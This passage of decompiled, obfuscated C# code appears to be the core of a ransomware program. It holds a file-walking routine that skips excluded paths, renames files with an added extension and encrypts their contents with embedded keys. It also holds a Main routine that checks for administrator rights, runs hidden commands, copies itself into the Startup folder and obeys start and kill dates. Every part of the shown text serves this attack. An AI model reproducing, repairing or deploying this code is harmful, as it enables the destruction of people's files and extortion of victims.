			if (((!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107389347)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388778)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388745)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388760)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388715)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388690)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388701)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388656)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388675)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388638)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388629)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388612)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388554)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388565))) || CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(getString_0(107389052)))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388979)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388994)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388945)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388960)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388911)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388926)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388877)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388892)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388847)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388858)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388813)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388832)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388271)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().Contains(getString_0(107388286)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(getString_0(107388237))) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388212)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107396229)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388199)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388174)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388169)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388196)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(getString_0(107388191)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(getString_0(107388186)) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) && !CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
			{
				if (nBTsxqqCcIrA.Length != 0)
				{
					string[] array = nBTsxqqCcIrA;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1036;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.EndsWith(MaDQWNsFQFSMFZ))
					{
						goto IL_1036;
					}
				}
				catch (Exception)
				{
					goto IL_1036;
				}
				if (!SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
				{
					if (BBqvZtJMKtZyzF == getString_0(107396809))
					{
						try
						{
							if (uruahRFIszrntX.bURwEzWcMZKaoi(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA))
							{
								uruahRFIszrntX.BBxxokkeNIlNHfR(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					Thread thread = new Thread((ThreadStart)delegate
					{
						try
						{
							if (fgLeGcGjPkpRXH)
							{
								Console.WriteLine(SmDDBVlBSoLlZfP.getString_0(107402711) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + SmDDBVlBSoLlZfP.getString_0(107402608) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + SmDDBVlBSoLlZfP.getString_0(107402587));
								Console.WriteLine(SmDDBVlBSoLlZfP.getString_0(107402686), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
								Console.WriteLine(SmDDBVlBSoLlZfP.getString_0(107402661), lBGXxmsJjqv.Elapsed);
								Console.WriteLine(SmDDBVlBSoLlZfP.getString_0(107402578));
							}
						}
						catch
						{
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA));
					}
					kstUyDfByMqYOzIx(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					try
					{
						new SnjLOUpfRioti().fwTUnyzIwakYqxR(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (fgLeGcGjPkpRXH)
								{
									Console.WriteLine(getString_0(107403155) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402598) + new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length + getString_0(107402577));
									Console.WriteLine(getString_0(107402568));
								}
							}
							catch
							{
							}
							xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107402495)), getString_0(107388070) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107388070) + PbsdnvfpwWRvGCs(getString_0(107402438)) + getString_0(107388070) + Environment.UserName + getString_0(107388070) + PbsdnvfpwWRvGCs(getString_0(107402453)));
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402428) + ex2.Message + getString_0(107395729));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length != 0L)
							{
								goto end_IL_0880;
							}
							goto end_IL_087f;
							end_IL_0880:;
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402827) + ex2.Message + getString_0(107395729));
								}
								catch (Exception)
								{
								}
							}
							LVKhJcfUHGhpJNXz++;
							goto end_IL_087f;
						}
						if (QOKbVStgyeVL == getString_0(107396809) && new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024)
						{
							try
							{
								if (MaDQWNsFQFSMFZ != getString_0(107386219))
								{
									if (YazilaoopZ)
									{
										MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
									}
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107402766) + ex2.Message + getString_0(107395729));
									}
									catch (Exception)
									{
									}
								}
								LVKhJcfUHGhpJNXz++;
								return;
							}
							if (MaDQWNsFQFSMFZ != getString_0(107386219))
							{
								CS_0024_003C_003E8__locals0.ldrdWbhdALtRA += MaDQWNsFQFSMFZ;
							}
							if (DXDIUZMazYGZy == getString_0(107396809))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item in YoPwmbBPpdD)
									{
										if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.irnVJvnuIedJmu.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == SmDDBVlBSoLlZfP.getString_0(107396819))
										{
											if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA).Length)
											{
												try
												{
													yWTIBbUKdpiy.ybntlhJHhisLb(SmDDBVlBSoLlZfP.getString_0(107389894), SmDDBVlBSoLlZfP.getString_0(107389889), SmDDBVlBSoLlZfP.getString_0(107389844), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ldrdWbhdALtRA.ToLower().EndsWith(item) && HFFrRFIpQgjXI == SmDDBVlBSoLlZfP.getString_0(107396643))
										{
											try
											{
												yWTIBbUKdpiy.ybntlhJHhisLb(SmDDBVlBSoLlZfP.getString_0(107389894), SmDDBVlBSoLlZfP.getString_0(107389889), SmDDBVlBSoLlZfP.getString_0(107389844), CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											}
											catch
											{
											}
										}
									}
								});
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == getString_0(107396633))
							{
								byte[] array2 = null;
								byte[] byte_ = NQdDIFAnEzVM.KQanXSigbuDh(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
								if (!NQdDIFAnEzVM.EHTmbBVFpgxa(AaZhmxjLrXnGZ: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), zTKGzNBbRH: CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, KJxeENlSQsJIpV: bytes))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (!GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
								{
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!GeksFIyCuYbq.uVsAlcvYzOr(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, UawyhGBHBLgS, MXXPCoXZKEzPC, bytes, Convert.FromBase64String(sTQyJSLcZOIiC)))
							{
								try
								{
									File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
						}
						else
						{
							if (YazilaoopZ)
							{
								MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + MaDQWNsFQFSMFZ;
							}
							byte[] bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (MaDQWNsFQFSMFZ != getString_0(107386219))
							{
								if (!UOlZmEwYRBbnfmvt)
								{
									if (!PAOJgADrbjEa)
									{
										fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
									}
									else
									{
										fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC));
									}
								}
								else
								{
									try
									{
										if (!PAOJgADrbjEa)
										{
											TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
										}
										else
										{
											TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
										}
									}
									catch (Exception ex2)
									{
										if (CCDyMIHlAe)
										{
											try
											{
												File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107386237) + ex2.Message + getString_0(107395729));
											}
											catch (Exception)
											{
											}
										}
										LVKhJcfUHGhpJNXz++;
										try
										{
											File.Move(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
											return;
										}
										catch (Exception)
										{
											return;
										}
									}
								}
							}
							else if (!UOlZmEwYRBbnfmvt)
							{
								if (!PAOJgADrbjEa)
								{
									fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107386214), bGfpmpYMCsNkyjcK);
								}
								else
								{
									fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107386214), Convert.FromBase64String(MXXPCoXZKEzPC));
								}
							}
							else
							{
								try
								{
									if (!PAOJgADrbjEa)
									{
										TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
									}
									else
									{
										TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, Convert.FromBase64String(MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
									}
								}
								catch (Exception ex2)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386991) + CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + getString_0(107386237) + ex2.Message + getString_0(107395729));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									return;
								}
							}
							if (PAOJgADrbjEa)
							{
								if (MaDQWNsFQFSMFZ != getString_0(107386219))
								{
									XZXEHUgcqrufd(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA + MaDQWNsFQFSMFZ, bytes);
								}
								else
								{
									XZXEHUgcqrufd(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA, bytes);
								}
							}
						}
						end_IL_087f:;
					}
					catch (Exception)
					{
					}
				}
			}
			goto IL_1036;
			IL_1036:
			vJUzSMoRbycwzG.Remove(CS_0024_003C_003E8__locals0.ldrdWbhdALtRA);
		}

		static mDsrdwsfBAgqx()
		{
			Strings.CreateGetStringDelegate(typeof(mDsrdwsfBAgqx));
		}
	}

	private sealed class cTttKVwFNmpq
	{
		public string cQQeCUDDoZYTm;

		public string eedfnXcwSQkQNFbIx;

		public void _003CEncrypt2_003Eb__44()
		{
			while (true)
			{
				try
				{
					File.Delete(cQQeCUDDoZYTm);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__45()
		{
			while (true)
			{
				try
				{
					if (File.Exists(eedfnXcwSQkQNFbIx))
					{
						File.Delete(eedfnXcwSQkQNFbIx);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string gheRqfduEuJ;

	public static byte[] bGfpmpYMCsNkyjcK;

	public static string HirTGWkSHczrmbY;

	public static string nsiwXjKpMUO;

	public static List<string> ZmKssmQIdPi;

	public static List<string> sjbNOeTfHdjfd;

	public static string zMQimCitOD;

	public static string MXXPCoXZKEzPC;

	public static string sTQyJSLcZOIiC;

	public static string EXVykcHaTCNay;

	public static string szjPprKwdybiP;

	public static int IwCCvRldil;

	public static string BBqvZtJMKtZyzF;

	public static string MkWPFkyuHrLz;

	public static string tGBTkHzktdbqpsN;

	public static string IHkGIfOFsBs;

	public static string PktefsOLxgM;

	public static string lvMwbEyyvL;

	public static string btzEVEliaCMI;

	public static string DhKuNmjsjM;

	public static List<string> FBdBqWxFZQgyhcDd;

	public static List<string> HMEbcaxMfcYzgl;

	public static string wbKIZmscSBasobt;

	public static string dVUrkAuvmqKS;

	public static string uSiPWDmilru;

	public static List<string> SNtBTLidlROtoV;

	public static string OcAolhvchhcmQ;

	private static string emRwjmkqcwElZk;

	public static string rmNaxrdaErS;

	public static string nnUkiNRMVi;

	public static List<string> BjijgdTbDd;

	public static List<string> VfIRuRDoHW;

	public static List<string> ZSMEaXFyFht;

	public static List<string> OKgBAQeRHSlym;

	public static string edpjkmWiBB;

	public static List<string> pmzwKqsyDlmmF;

	public static List<string> soEYuRQrgwk;

	public static string aYqzBWQifeA;

	public static string KvaSlDHIXTUnK;

	internal static DateTime GgwzZdkgUSWq;

	internal static DateTime uXNZJauCoqTzJG;

	public static string QOKbVStgyeVL;

	public static string UawyhGBHBLgS;

	public static string SSLjTeVGTsW;

	public static string fNMfifGmoXya;

	public static string rPQFiVwCriY;

	public static string yrIyoHrzWDCT;

	public static string NwrSvcEHBCxFfoz;

	public static string DXDIUZMazYGZy;

	public static List<string> YoPwmbBPpdD;

	public static string HFFrRFIpQgjXI;

	public static string PZYHNDUWTf;

	public static string MSbkqSPZNmrgShe;

	public static string xEVAdQHTwaeaG;

	public static string twJOYPWqzdD;

	public static string fKcZCslCfAJPz;

	public static string KWarveAlrUeLj;

	public static string CvhuRhPbSX;

	public static string bUDblfHLHXAcgkB;

	public static string vClGBOKLiQn;

	public static string EiyrcFiAoaX;

	public static string TcpbjRHBDJM;

	public static string SbkfEriDLMxWh;

	public static string brYmtXjlZIq;

	public static string NMKbJRePeNuLz;

	public static string OIjqWZRpNdE;

	public static string YwXcfYcDlzL;

	public static string cBZuqZfyygLLC;

	public static string XoculucrhuBC;

	public static string RoiBxbbYOpTnzdF;

	public static string lMZoDXXDrlQgS;

	public static string tBZYVYiWJKaS;

	public static string cuUuUUMpmxH;

	public static string NnZoLXRmVCvIOhK;

	public static string nmjDhIwEGnMOrO;

	public static string aYrdlpstiAwAZTu;

	public static string nqNdPWHffReq;

	public static string FIKBEEWFPHteV;

	public static string EYUcFTYiTRnwV;

	public static string[] YacSoacXjaCUC;

	public static string QtTrkEhpkGUJgMO;

	public static bool uBIPmjbCjNt;

	public static string VVNvuJuOCGKqN;

	public static bool PAOJgADrbjEa;

	public static bool hxCcwpobkJC;

	public static bool FRIhZgoxuuhF;

	public static bool ZaxDTmLwAHHZwVkZ;

	public static string dtHHyJMWMTcTg;

	public static bool CCDyMIHlAe;

	public static bool clhLaJHTBGOiPN;

	public static bool XdhdhAwnktmq;

	public static bool FRObTCxcUY;

	public static bool UOlZmEwYRBbnfmvt;

	public static string muQSQoYNOwJp;

	public static bool fgLeGcGjPkpRXH;

	public static Stopwatch lBGXxmsJjqv;

	public static int LVKhJcfUHGhpJNXz;

	public static int qXIAEocyZgLqByS;

	public static bool YazilaoopZ;

	public static string tltXBlUAjNeRsFxCp;

	public static string[] caYhozbaifo;

	public static List<string> KlnqoelvmWHjj;

	public static int GCkorullzoFEFAMeg;

	public static bool RaNDyCdUClri;

	public static bool UzsRVBPOjcbvM;

	public static bool CoyMCdqKPDBfCk;

	public static bool LoAUTpZIRmiA;

	public static bool AngOozHSWJQ;

	private static ThreadStart CS_0024_003C_003E9__CachedAnonymousMethodDelegateb;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatee;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegatef;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate10;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate11;

	private static Action<string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate12;

	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("kernel32.dll")]
	private static extern bool AllocConsole();

	[DllImport("kernel32.dll")]
	private static extern bool SetProcessShutdownParameters(uint uint_0, uint uint_1);

	private static void Main(string[] args)
	{
		try
		{
			sUARzlGRFHDde CS_0024_003C_003E8__locals0 = new sUARzlGRFHDde();
			CS_0024_003C_003E8__locals0.avfxhzATpymbWL = Process.GetCurrentProcess().ProcessName;
			if (Process.GetProcesses().Count((Process process_0) => process_0.ProcessName == CS_0024_003C_003E8__locals0.avfxhzATpymbWL) > 1)
			{
				return;
			}
		}
		catch (Exception)
		{
		}
		try
		{
			GpSuvmMCrcEnBNN.hcOINnEUSDotta(emRwjmkqcwElZk);
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYrdlpstiAwAZTu == getString_0(107396791))
			{
				Thread thread = new Thread(ReEGuVGZtzhJ.QwimkMrTSXf);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch
		{
		}
		SetProcessShutdownParameters(0u, 0u);
		if (tGBTkHzktdbqpsN == getString_0(107396791))
		{
			Thread.Sleep(int.Parse(IHkGIfOFsBs));
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && NwrSvcEHBCxFfoz == getString_0(107396791))
		{
			try
			{
				ubalMIbEpbeY(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107396818))));
			}
			catch
			{
			}
		}
		try
		{
			if (btzEVEliaCMI == getString_0(107396791) && rUWlmNUEHkRDZnc.MrNSMcrnGHkS())
			{
				new OxzYFgRfXvAi().rhmOIzRJpvKvUO(bool_0: false);
				rUWlmNUEHkRDZnc.tpoDbbyMSIwk();
			}
		}
		catch (Exception)
		{
		}
		if (dVUrkAuvmqKS == getString_0(107396791) && rUWlmNUEHkRDZnc.MrNSMcrnGHkS())
		{
			new OxzYFgRfXvAi().rhmOIzRJpvKvUO(bool_0: false);
			new OxzYFgRfXvAi().ijStrwHioHMPyDK();
		}
		if (MkWPFkyuHrLz == getString_0(107396791))
		{
			zLMHFUDcZsbRcx.leUcrsvMUGz();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397225);
			string text2 = text + Path.GetFileName(fileName);
			if (szjPprKwdybiP == getString_0(107396791) && fileName != text2)
			{
				Thread thread2 = new Thread(OvqakdodhLDH);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (zMQimCitOD == getString_0(107396791) && mainModule != null && fileName != text2)
			{
				try
				{
					IwCCvRldil = EwHBDgtvrOMYeg(0, FBdBqWxFZQgyhcDd.Count);
					File.Copy(fileName, text + FBdBqWxFZQgyhcDd[IwCCvRldil], overwrite: true);
					getString_0(107397220);
					Process.Start(text + FBdBqWxFZQgyhcDd[IwCCvRldil]);
					OQGiATnqshpg();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (aYqzBWQifeA == getString_0(107396791) && DateTime.Now < GgwzZdkgUSWq)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (KvaSlDHIXTUnK == getString_0(107396791) && DateTime.Now > uXNZJauCoqTzJG)
			{
				OQGiATnqshpg();
			}
		}
		catch
		{
		}
		try
		{
			AllocConsole();
			Console.Title = getString_0(107396422);
			if (SbkfEriDLMxWh == getString_0(107396791))
			{
				Console.WriteLine(getString_0(107396252));
			}
			lBGXxmsJjqv.Start();
		}
		catch
		{
		}
		aURDBxqxWYKvx();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegateb == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegateb = delegate
			{
				List<string> vfIRuRDoHW = VfIRuRDoHW;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatee == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatee = delegate(string string_0)
					{
						xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386134)), string_0);
					};
				}
				Parallel.ForEach(vfIRuRDoHW, CS_0024_003C_003E9__CachedAnonymousMethodDelegatee);
				List<string> zSMEaXFyFht = ZSMEaXFyFht;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegatef == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegatef = delegate(string string_0)
					{
						xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), string_0);
					};
				}
				Parallel.ForEach(zSMEaXFyFht, CS_0024_003C_003E9__CachedAnonymousMethodDelegatef);
				if (EYUcFTYiTRnwV == getString_0(107396791))
				{
					string[] yacSoacXjaCUC = YacSoacXjaCUC;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
						{
							xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386153)), getString_0(107386128) + string_0 + getString_0(107386119));
						};
					}
					Parallel.ForEach(yacSoacXjaCUC, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				}
				if (!oZZPobIwxSNjCO().Contains(getString_0(107386839)))
				{
					wDQhPDGrMto(edpjkmWiBB);
				}
				else
				{
					List<string> oKgBAQeRHSlym = OKgBAQeRHSlym;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
						{
							xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107386082))), string_0);
						};
					}
					Parallel.ForEach(oKgBAQeRHSlym, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				}
				List<string> source = pmzwKqsyDlmmF;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107386089)), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegateb);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396211))))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107396211)));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains(getString_0(107396706)))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
